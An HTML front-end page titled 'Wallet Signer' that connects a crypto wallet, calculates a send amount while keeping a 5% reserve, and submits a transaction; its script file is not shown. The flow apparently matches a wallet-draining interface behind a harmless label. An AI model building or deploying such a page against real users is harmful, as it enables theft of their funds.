<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HTML Wagmi Example</title>
    <link rel="stylesheet" href="css/App.css" />
  </head>

  <body>
    <div class="pages" id="app">
      <div class="container">
        <img src="/reown.svg" alt="Reown" class="logo" />
        <h1 class="title">Wallet Signer</h1>

        <!-- Single Connect Button -->
        <button id="connect-button" class="primary">Connect</button>

        <!-- Loader & Feedback (inline) -->
        <div id="loaderContainer" class="loader-hidden">
          <div class="status-wrap">
            <div class="spinner" id="spinner" aria-hidden="true"></div>
            <div id="statusIcon" class="status-icon" aria-hidden="true"></div>
          </div>
          <div id="liveFeedback" class="feedback">Waiting...</div>
        </div>

        <!-- Status tree: shows each step and its success state -->
        <div id="statusTree" class="status-tree">
          <div class="status-item" id="step-connected">
            <div class="s-icon" id="icon-connected">○</div>
            <div class="s-label">Connected</div>
          </div>
          <div class="status-item" id="step-calculated">
            <div class="s-icon" id="icon-calculated">○</div>
            <div class="s-label">Calculated send amount (reserve 5%)</div>
          </div>
          <div class="status-item" id="step-submitted">
            <div class="s-icon" id="icon-submitted">○</div>
            <div class="s-label">Transaction submitted</div>
          </div>
        </div>

        <!-- Modal removed — toasts are used for the full flow -->
        <!-- Toast container (for animated toast alerts) -->
        <div id="toastContainer" aria-live="polite" aria-atomic="true"></div>
      </div>
    </div>
    <script type="module" src="/src/main.js"></script>
  </body>
</html>
